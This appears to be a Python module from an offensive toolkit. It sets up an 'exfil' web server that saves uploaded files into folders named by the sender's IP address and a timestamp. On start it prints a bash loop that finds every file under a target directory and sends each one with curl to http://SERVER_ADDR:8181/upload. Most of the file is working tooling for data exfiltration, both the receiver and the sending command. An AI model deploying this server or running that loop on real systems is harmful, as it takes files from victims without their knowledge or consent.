from base.webserver import *
from base.webserver import init as base_init
from werkzeug.utils import secure_filename
from lib.helper import get_timestamp
import os

class Campaign(Base):
  def __init__(self):
    super().__init__('exfil')

  @route('/upload', methods=['POST'])
  def index(self):
    if 'file' in request.files:
      f = request.files['file']
      folder_name = f'{self.get_remote_addr()}:{get_timestamp()}'
      make_new_dir(os.path.join(self.root_dir, folder_name))
      fname = secure_filename(f.filename)
      dest = os.path.join(self.root_dir, folder_name, fname)
      f.save(dest)
      print(f'self.get_remote_addr() : Saved file as {dest}')
    return 'OK\n'

def make_new_dir(path):
  os.makedirs(path, exist_ok=True)

def init(args):
  base_init(args)
  example = """#/bin/bash
target="$1"
if [[ -d "$target" ]]; then
  find "$target" -type f -print0 |while IFS= read -r -d '' file; do
    echo "File: $file"
    curl http://SERVER_ADDR:8181/upload -F "file=@/$file"
  done
fi"""
  print("You can exfil this way as an example:")
  for line in example.splitlines():
    print(line)

Campaign.register(server, route_base='/')
